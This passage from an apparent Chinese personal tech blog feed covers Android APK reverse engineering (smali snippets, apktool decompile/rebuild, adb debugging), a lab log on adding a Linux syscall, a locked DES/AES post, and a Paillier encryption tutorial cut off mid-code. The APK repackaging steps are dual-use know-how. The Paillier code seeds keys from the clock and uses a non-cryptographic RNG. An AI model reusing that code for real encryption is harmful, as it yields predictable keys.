class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>保存的 trace 文件可以 dump 出来使用 monitor 来打开。</p><h3 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const-string v1, &quot;%d&quot; # 格式化描述符</span><br><span class="line">const/4 v2, 0x1 # 数组长度</span><br><span class="line">new-array v2, v2 [Ljava/lang/Object; # 创建Object数组</span><br><span class="line">aput-object v3, v2, v4 # 填充数组</span><br><span class="line">...</span><br><span class="line">invoke-static &#123;v1, v2&#125;, Ljava/lang/String;-&gt;format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String; # 格式化字符串</span><br><span class="line"># 字符串替换</span><br><span class="line">invoke-virtual &#123;v0, v1, v2&#125;, Ljava/lang/String;-&gt;replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;</span><br><span class="line">invoke-virtual &#123;v0, v1, v2&#125;, Ljava/lang/String;-&gt;replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;</span><br></pre></td></tr></table></figure><h3 id="waitForDebugger"><a href="#waitForDebugger" class="headerlink" title="waitForDebugger"></a>waitForDebugger</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;&#125;, Landroid/os/Debug;-&gt;waitForDebugger()V</span><br></pre></td></tr></table></figure><h1 id="apktool-ShakaApktool"><a href="#apktool-ShakaApktool" class="headerlink" title="apktool/ShakaApktool"></a>apktool/ShakaApktool</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar apktool.jar d example.apk -o example-dir</span><br><span class="line">java -jar apktool.jar b example-dir -o example.apk</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>d</code></td><td style="text-align:center">反编译</td></tr><tr><td style="text-align:center"><code>b</code></td><td style="text-align:center">回编译</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ShakaApktool.jar d -df example.apk -o example-dir</span><br><span class="line">java -jar ShakaApktool.jar b example-dir -o example.apk</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>-df</code>、<code>--default-framework</code></td><td style="text-align:center">使用默认的框架资源文件</td></tr></tbody></table><h1 id="安卓-apk-调试（不需要修改原-apk-文件）"><a href="#安卓-apk-调试（不需要修改原-apk-文件）" class="headerlink" title="安卓 apk 调试（不需要修改原 apk 文件）"></a>安卓 apk 调试（不需要修改原 apk 文件）</h1><ol><li>使用 apktool/ShakaApktool 反编译 apk 文件</li><li>在 Android Studio 中导入源码</li><li>设置远程调试选项，Host 填写为 localhost，端口填写为 8700</li><li>使用 adb 以 debug 方式启动 apk：<code>adb shell am start -D -n packageName/ActivityName</code></li><li>下好断点，打开 monitor，开始调试</li></ol><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://www.52pojie.cn/thread-395689-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-395689-1-1.html</a><br><a href="https://www.52pojie.cn/thread-396966-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-396966-1-1.html</a><br><a href="https://www.52pojie.cn/thread-397858-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-397858-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;开始学习安卓。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
      <category term="android" scheme="https://qianfei11.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>如何给Linux添加系统调用</title>
    <link href="https://qianfei11.github.io/2019/11/27/%E5%A6%82%E4%BD%95%E7%BB%99Linux%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    <id>https://qianfei11.github.io/2019/11/27/%E5%A6%82%E4%BD%95%E7%BB%99Linux%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</id>
    <published>2019-11-27T05:50:19.000Z</published>
    <updated>2019-12-10T12:35:56.400Z</updated>
    
    <content type="html"><![CDATA[<p>操作系统实验记录。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>OS：Ubuntu 16.04.6</p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ uname -a</span><br><span class="line">Linux ubuntu 4.15.0-70-generic <span class="comment">#79~16.04.1-Ubuntu SMP Tue Nov 12 14:01:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><h1 id="First-Download-Linux-Kernel-Source"><a href="#First-Download-Linux-Kernel-Source" class="headerlink" title="First: Download Linux Kernel Source"></a>First: Download Linux Kernel Source</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.20.17.tar.gz</span><br><span class="line">tar -xvf linux-4.20.17.tar.gz</span><br><span class="line">sudo mv linux-4.20.17/ /usr/src/</span><br><span class="line">cd /usr/src/linux-4.20.17/</span><br></pre></td></tr></table></figure><h1 id="Second-Install-Dependences"><a href="#Second-Install-Dependences" class="headerlink" title="Second: Install Dependences"></a>Second: Install Dependences</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install bison flex libssl-dev libncurses5-dev</span><br></pre></td></tr></table></figure><h1 id="Third-Add-My-Syscall"><a href="#Third-Add-My-Syscall" class="headerlink" title="Third: Add My Syscall"></a>Third: Add My Syscall</h1><p>入口（<code>arch/x86/entry/syscalls/syscall_64.tbl</code>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Here are my syscalls</span><br><span class="line">548     64      mysyscall               sys_mysyscall</span><br></pre></td></tr></table></figure><p>系统调用声明（<code>include/linux/syscalls.h</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Here are my syscalls</span></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_mysyscall</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>添加调用（<code>kernel/sys.c</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Here are my syscalls</span></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_mysyscall</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">printk(<span class="string">"Hello Kernel!!!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1712190426</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Forth-Compile"><a href="#Forth-Compile" class="headerlink" title="Forth: Compile"></a>Forth: Compile</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">make mrproper</span><br><span class="line">make clean</span><br><span class="line">make menuconfig <span class="comment"># 将Device drivers中的Staging drivers取消</span></span><br><span class="line"><span class="comment"># 下面的编译时间比较久 可以通过time记录一下时间</span></span><br><span class="line">time make bzImage <span class="comment"># 编译并生成压缩的内核映像 大约半个小时</span></span><br><span class="line">time make modules <span class="comment"># 编译模块 大约两个多小时</span></span><br><span class="line">sudo time make modules_install <span class="comment"># 安装模块 大约三分多种</span></span><br><span class="line">sudo time make install <span class="comment"># 安装内核 大约一分多钟</span></span><br></pre></td></tr></table></figure><p>编译成功后 reboot 重启系统。</p><h1 id="Fifth-Test"><a href="#Fifth-Test" class="headerlink" title="Fifth: Test"></a>Fifth: Test</h1><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ uname -a</span><br><span class="line">Linux ubuntu 4.20.17 <span class="comment">#1 SMP Thu Nov 28 22:48:22 PST 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><p>查看添加的系统调用是否成功：</p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ grep -A 1 mysyscall /proc/kallsyms</span><br><span class="line">0000000000000000 T sys_mysyscall</span><br><span class="line">0000000000000000 T usermodehelper_read_unlock</span><br></pre></td></tr></table></figure><p>编写测试程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">long</span> ret = syscall(<span class="number">548</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%ld\n"</span>, ret);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果，返回值为设定好的值：</p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ./3</span><br><span class="line">1712190426</span><br></pre></td></tr></table></figure><p>使用 dmesg 命令（dmesg 命令显示 linux 内核的环形缓冲区信息，我们可以从中获得诸如系统架构、cpu、挂载的硬件，RAM 等多个运行级别的大量的系统信息）查看调用情况：</p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ dmesg | grep <span class="string">"Hello"</span></span><br><span class="line">[  228.310507] Hello Kernel!!!</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.cnblogs.com/tod-reg20130101/articles/9280792.html" target="_blank" rel="noopener">https://www.cnblogs.com/tod-reg20130101/articles/9280792.html</a><br><a href="https://www.zybuluo.com/hakureisino/note/514321" target="_blank" rel="noopener">https://www.zybuluo.com/hakureisino/note/514321</a><br><a href="https://www.jianshu.com/p/b2d5fa8af581" target="_blank" rel="noopener">https://www.jianshu.com/p/b2d5fa8af581</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;操作系统实验记录。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="linux" scheme="https://qianfei11.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Python实现DES、AES加密解密算法</title>
    <link href="https://qianfei11.github.io/2019/11/14/Python%E5%AE%9E%E7%8E%B0DES%E3%80%81AES%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>https://qianfei11.github.io/2019/11/14/Python%E5%AE%9E%E7%8E%B0DES%E3%80%81AES%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/</id>
    <published>2019-11-14T02:09:38.000Z</published>
    <updated>2020-02-09T08:10:54.905Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Enter Password and Continue Reading...</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="7fd51c59dc68e53612837008a3a0c7aaf8b0ee4228bf9d65233672f94204bf0d">60fc22347b86984818dbccb7ad633c8f2d7d398be8ebcd9b2cf39e5ab47d1437a0a417a593ea0ebbbbd9fda84d54b61f2aa445ca88d9eabf2c085d9413f7d40e7b4b8f8513f9de2a262d98563fff89a2278eb4df11df2e2f311595b76f8c468fd1767a39b48c476970783127f5753485004870234536ae50d249c903edef4091a1e28d674ddf21d492ddab7473640953c1b0ad81db81bfed07bb689342214f1bd07c2277ed5641fb7ee9e36722f2d2e87135f8f5378f8c273bacf12151a3bed37809b40d29a38cae04d246f03b75849005e01d136659c28c78731acbe963405063cdc435801e290b11f9de81d61400ef4fe0d313636ddddf37083710d1f6a62128c0944cdd23a4fae719ecdbffba3b26d9c55b348888a95fafee7ee22881877b94aa94b6fd2efe753ee51942fdcaa97ffec65b0881f293feae4b841cd0b11e69df240ed477db80c08218bc642e52621432a7704e11bb78c90153eb203271a232263baa9081dc71ffa89f5c3b08b5c7af987b6e64f29062468e2fb5f03f8f7167b89b2224730cabfc66e9ac39ad7d2685cff4ca6204ea8b4d72e8af27c9b7ffdd25aeb905f3eba5c21eab740ae1de51ebccab01e187ee9867bc73aea726e5337514a1fef19b0aac1dccd47c4d97811247ac404156edabfe0971edbbebe76e4e547891f6a4763b5159a1e9e358ee0c3e7a30074515bf03baa57a30c1fbb99dcc97641c84661dcccb584b85e88f0162affea27de0cce07fbfec8d69728891e1a04a7b742436bb5f7b49480bb2bbba629ac48902a738514c93237841ef2f8986b517ada3c1df00c2107ee7b21f611bac85ed2f059b207af8084e5f551d2c0132bb6bfbf3937cc741445388fe863c7ee2fa8a5fa5921bebc38a470071870b02fe168ea9fd18a2170667cbc769a633bec621113a28976d7d20955b57e51f31231170dc1ab54bf89e11b824c43d003ed22707d422c86a8d86df5e9db53746fac529246a225d4eacc8725a6b9115f653e717a832937e2fdd536b010396e6d4332ca7ee63004a3680fd4e1de26e5e842729ab1036dd6270344f7c10ef0e7d55bb2f30ead272048e76aecd1dc1581a19a08c5d6afc2df8959d687055ca35f15640be6317899329304e2d4229746ff0b3f9a05599690795fba6ae2739cd5d871bdd016b70b221c0ebc5aa911d2fcf9c46ac3c210754df6b8e431889acd7479275b4dd3fef78fec8f64dbf9d36a984dc141fd06b5db8a76e49509bd7acff4452dd31363cb866002ec10d30fd9ed1a4a484c76509d6bf7c59d5c6f2cc21e50327ac19f58a0a3233a4dee7b65ef2465a5755539e5c5c18ada556a50fe43d08902f0640d7b388b58a6b24714e4c65810a7905240a89faf182d394ecf44c1625f9d951950c01e45faf9cde80307e2f9fdee9f88abe704cb4ae7631095c59bdbc3b04a0601303ae8ada4c9251f68aeb13333c007d5977b080c63789fb36531ea51c8f4f872b11bf049afe73862b497d43869d0c4feb797169166e696e1cab6623584ba0581f2a83a7c051d1f638b15eb6ce428c395181f92a24b20eb293edb7b7766ca5049c2fd81da476f790cc0a7e384cc583c821d3e488d583cf7728804b8bfaddf94b1f29bcfccd719493abf9a63327d6f776eecad733c6f1f4350b1035fea3dec1981d82b1c423efa596a833ce2edb8ee599e5a807cfe8c9bf63e901b959cdcf8554d1ddc3492d9b5a5f9f8fb253926ac0b6a47a7625af68936bcd5de10ec3e15eb666e30097273fd36ce37138fdf1aafbe8c929a61b887ae524f3cec81fa5c31c426a754c43e2c7a2e3d4127911035f05f096152c377a597dc58771bd6addc2f52fae5008178d22cf4dfd882d1b80de7567d08401bf30ea48a9a77efb02132dd161147a533ce69bdaf3eca699e7fee5a281f51653755040acb045be24d2460b3a1783cf9bfbea411e8df9dff03860815fcb96c02b2e7eb4fdc9b47d2148a47eefbe6d1c9ecb1def7632b452767e0737cd26f39e9a9ed33b3dce95468635f2072d384b99f0c8a966a42ddc4ac3204f6e3acf9420bec5422d3bb9f3da11451aa9fb2a48acf7936f8d55ae5ff2c0d23e00f24f3af61ec08eb07e42330a353a319704310bd8239ac677ae9703ca62b111c22994414a6c53cce83f06f2203ba145fa63df55629e95e1920a17a12b39ae8371d1856b86a0c7e34d01d5ed3ad0eff8e1f07b58000aac85774eed12caa70fc4f0be8fcb472ce9effe5a982fedac199cbe16d4c83dc8c475660aa8bfc274333e1826aaed0d8f84707084ac5350c1ad42dbbf36d3cb9f6b71dd2c640466054dfff623a19ecffb44a30fd32ac9b5132dad187f0bcc8a321359088856479206c33889f1ccc4243f568a1f14489680d31cfa03ca5e2ced5d2cd558898d09b546d6dc76d7cf423edf7da4bd9ce564e11a5d1f13ad65f7bbb5be708da2b9c199e82ea05ed9a1c3f324dd9f57093d63114a46cf5863387e3ec63311432ffceb5af095c5014faddec1cbc6fbfba6e0881722abb93816df5df7be2b60fed0642fd71c8b1795de870d8c01881f0aa7c4b353b1ae09c960d0d32a02c47f87ad8776445e77021fbb91317e47c0d6f0d413102ca59929793638dfda693e2525ec6c73a4a2cb9b141a8da0011d046aaa8f0da31843b82716dfcc39cb2ebb689e359ece31883b5c24774bc1ca7f3e74bda3597d76bab93ac2d6e2d9669ad47fa5a916765211ed87dba859cf9329e0050995468d7c4674f7a0bd75326cbc998b8f138ad937dc50ca082dfbe95438fb64987f3a837d9359ba20a719675d67d6ec7b5f8faeeb5c8b776ad14a18f5a2a27fc370fc4da567bed3070a1abd9b3bde6bdac566dd5fb3627a5130aada365c52d1f520d99e16bfe90970967cdb72f56f0c85e0c724121f250a0bbe2fec5ea1ad962e381472706323d301606ac4ecb87b0e6ad0c170b65f1206f10f2209f30abaa8e7ad17b3f2944767046c14ff046a22780d4d32e0d985ab7be9f177778ea0752cf6a05596e8a2d6d10896328cef3c5ec55cb8e4bd5ab4acb15109f851b00c21e0cad6ba35d649026b9d024b27e666cf48ffc3649de16462f6f09f2edc815bcdac5d875c8a77aa550cb0abbe09bc8172acc6d8ac75555070cc6c13b0b8a0df751092ae5565168ab7cf6b4f6ba612263595458130628b455e21534f3efe3ac8756a5c2f1ce33af249db5571279acdae93ea7469f3bd41a1b869895b1d14811dcdfc71fa6606153dbed48e161648916c2dbd4f2566a787be650e88c5e5316b9798c2b56aecfb9fd0dbe711d37adbbd03e3d173a070208dd6d07ece421492ff11884c83ad86c8b745fd794dd3cd34eb31316562e8b7405bc1884e52525cd33a829c013cb4126c4681685869ae2a8f966ca10476b360e8e2cb3e527f3e26626147034a5c58817192ad38d49014a2319d22d0501484eb1c845bd12231284f8225a7ddeb803f56a28bfa2d50daeb61aedce2b116f02b8486739a87d13fb244473badfc01617599e1c678bda03b57ee26b96d890a504721dee1f571c19bc5e36a62d23676be704fda29b64aedf9bfb25b669be763745426c91f75726832b17803ef28e4d0ae53ce90d8f94cf686fd6b2864d1b830e4ae20452f9ea769a5840e2ae2bcefba88d5a4237346a526ab9fd4181adce62f6421dbaf5792352e64ea683b5d8a0284b3dfbe63a991b4d11ed379d17bd468dd6bf0fdf898fd41ca23fc219fd3325a614de1efdf2302cfb51166c7d487ef23ec0a5ceb827adefe785d5bbe684a65de841e51adb633d7090f8844a87f9e730b0c11b76d8da0b1c178f01424d7f0ea09b7a7207acff020d9a26c534e01826aed50b0d73dffeeca0b50eac071eeeda0bef05abe46da6b52e30274f554d01182a2ffb14f80962cb0231e664d8d2dc2d5e3e6e7c19f8d034ec775a0bb33b17c688e3f0109690b99808c58a4814953fbf0ca8fb236baac2fa743ff33d5070cb10f981582a02f7177f73b8899a457d6fb0612a27272da98baada743aa9dea70bf0a0b4d7852dfbfa5a99673bcc1c363e93d492ca8315593ab38bf2dcce245fb1a38edb24da01787bfa7fcb3892d7f5e501d71f29e639c73e4ffbabc4513cff7b9108e469b7fbfe5d8528995042c1577982da9067594388a02acdc1df53f6a2b68a6e4772bb7f801326895e22173ab221733e25fa923c67055e875bce1490018c05f8ab0d547b3cb06b73f32c3c8bc5b154414417779ea50c5e5a3b746c84709a9bbcb3e0c2f37938819c94fe160cf93ab97227863b1ba2460305b8afe9500a44eec6f06bdb3548c981a89165ef9794669c9835a921baeb488ef12f060e6a1fb03fed6e12870e78035a768103f7fd5244c36cfa80740e269752f729b86c36cc92f7ea2afb9744a372d8a764371068debdc628e6dd22f9ce3c639ee1f09e00fff08c95a2ba22d151b0b45a52bdd2095cc8ed55523afebd0eea72e1f486ea4ea5eb62f3de48d4d27548274bc89e1d7fd58b2122e5d9c67c51c7ba31e4bcb9bb726f6416b424b639e033354f54a25a0711a5a1b6f732ff71e891ea116c0ab1dd75042f11b58819d071814f53c3279b6ed0fd91deacd8e425a8e63725ab35299098655f690c21be2c7b39cb58ab3c70cddf934741cdcac0a1425bc0d649adf48995ae7e70906a14c8b11461893a3e48206c5dad31b5b525a22ebfeb63ea917548210f08c5762a6f2babcfeade8015a43e138747f615be357b8bf5eb77323041dc235df29cf46e64d7b296713df67e3805d237405ec0b1e4c7a284a09b8392bcb66068584f723c70c3a9d3206d9b2c07f0e87cc0b069171bef12991e6e28454b757d9abbd0bee7aad4cb8eac6c4b6bd81ca0e1897737fe5f4980712985fc0e553619294472621e2a77b07542184839dec5ea97b5fef0de0dc6c9d538cb0ba141f824e874b84727abbc04901908f7e5c349a279c94f2ba5940c71d0de78afcf84311780eaf21ee24a7ec76e5fdde5edb516065efe2614cb6ec01213c0a52a28800e9ef42dcf02029bf144574bd1fb761673c24b80baea9a480168f3987a58c0303bdbb10e4d15653fdb01512645b374cdf1cf91bbcf9c626caa9dbab037b009197bdc084c44a44ff7faa4e75b25d8a9ce74b8683d0e68eb5d5c9166e1992d6142adb3a2aaed4298a5b0ea61312d6f142aea4e239b7c9</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Continue Reading...
    
    </summary>
    
    
    
      <category term="crypto" scheme="https://qianfei11.github.io/tags/crypto/"/>
    
      <category term="python" scheme="https://qianfei11.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python实现Paillier加密解密算法</title>
    <link href="https://qianfei11.github.io/2019/10/24/Python%E5%AE%9E%E7%8E%B0Paillier%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>https://qianfei11.github.io/2019/10/24/Python%E5%AE%9E%E7%8E%B0Paillier%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/</id>
    <published>2019-10-24T03:49:26.000Z</published>
    <updated>2019-10-25T10:57:15.763Z</updated>
    
    <content type="html"><![CDATA[<p>Paillier 加密系统，是 1999 年 Paillier 发明的概率公钥加密系统。基于复合剩余类的困难问题。该加密算法是一种同态加密，满足加法和数乘同态。</p><a id="more"></a><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><h2 id="Keygen"><a href="#Keygen" class="headerlink" title="Keygen"></a>Keygen</h2><p>首先选择两个大素数 $p$ 和 $q$，计算出 $n$ 为 $p$ 和 $q$ 的乘积。并取一个随机数 $g$（通常取 $n+1$）。$n$ 和 $g$ 作为公钥。</p><p>然后根据卡迈克尔函数计算私钥 $\lambda$ 为 $p-1$ 和 $q-1$ 的乘积。</p><h2 id="Encipher"><a href="#Encipher" class="headerlink" title="Encipher"></a>Encipher</h2><p>加密时取一个随机数 $r$，计算出 $c \equiv g^m r^n(mod\ n^2)$。</p><h2 id="Decipher"><a href="#Decipher" class="headerlink" title="Decipher"></a>Decipher</h2><p>解密有一点复杂。首先我们可以得到：</p><p>$$<br>c^\lambda \equiv (g^m r^n)^\lambda \equiv g^{m \lambda} r^{n \lambda}(mod\ n^2)<br>$$</p><p>根据卡迈克尔函数，即对于任何 $\omega \in Z^*_{n^2}$，必定存在以下结论：</p><p>$$<br>\omega^{n \lambda} \equiv 1(mod\ n^2)<br>$$</p><p>那么可以得到 $c^\lambda \equiv g^{m \lambda}(mod\ n^2)$。</p><p>然后看看生成元 $g$，实际上是通过 $g=(1+\alpha n)\beta^n$ 得到的，并且 $\alpha,\beta \in Z^*_n$。由此可得：</p><p>$$<br>c^\lambda \equiv (1+\alpha n)^{m \lambda}\beta^{n m \lambda} \equiv (1+\alpha n)^{m \lambda}(mod\ n^2)<br>$$</p><p>再根据公式 $(1+n)^x \equiv 1+xn(mod\ n^2)$，可以得到：</p><p>$$<br>c^\lambda \equiv (1+n)^{\alpha m \lambda} \equiv 1+n \alpha m \lambda(mod\ n^2)<br>$$</p><p>然后我们在此处定义一个函数 $L(x)=\frac{x-1}{n}$，则 $L(c^\lambda)=\alpha m \lambda$。</p><p>那么我们可以得到明文的计算公式为 $m \equiv \frac{L(c^\lambda)}{L(g^\lambda)} \equiv \frac{\alpha m \lambda}{\alpha \lambda} \equiv m(mod\ n)$。</p><h1 id="Getting-started"><a href="#Getting-started" class="headerlink" title="Getting started"></a>Getting started</h1><p>通过 gmpy2 和 libnum 库实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span><span class="params">(rs)</span>:</span></span><br><span class="line">    p = gmpy2.mpz_urandomb(rs, <span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> gmpy2.is_prime(p):</span><br><span class="line">        p = p + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L</span><span class="params">(x, n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (x - <span class="number">1</span>) / n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span><span class="params">()</span>:</span></span><br><span class="line">    rs = gmpy2.random_state(int(time.time()))</span><br><span class="line">    p = get_prime(rs)</span><br><span class="line">    q = get_prime(rs)</span><br><span class="line">    n = p * q</span><br><span class="line">    lmd = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#g = random.randint(1, n ** 2)</span></span><br><span class="line">    g = n + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> gmpy2.gcd(L(gmpy2.powmod(g, lmd, n ** <span class="number">2</span>), n), n) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[!] g is not good enough'</span></span><br><span class="line">        exit()</span><br><span class="line">    pk = [n, g]</span><br><span class="line">    sk = lmd</span><br><span class="line">    <span class="keyword">return</span> pk, sk</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encipher</span><span class="params">(plaintext, pk)</span>:</span></span><br><span class="line">    m = libnum.s2n(plaintext)</span><br><span class="line">    n, g = pk</span><br><span class="line">    r = random.randint(<span class="number">1</span>, n ** <span class="number">2</span>)</span><br><span class="line">    c = gmpy2.powmod(g, m, n ** <span class="number">2</span>) * gmpy2.powmod(r, n, n ** <span class="number">2</span>) % (n ** <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 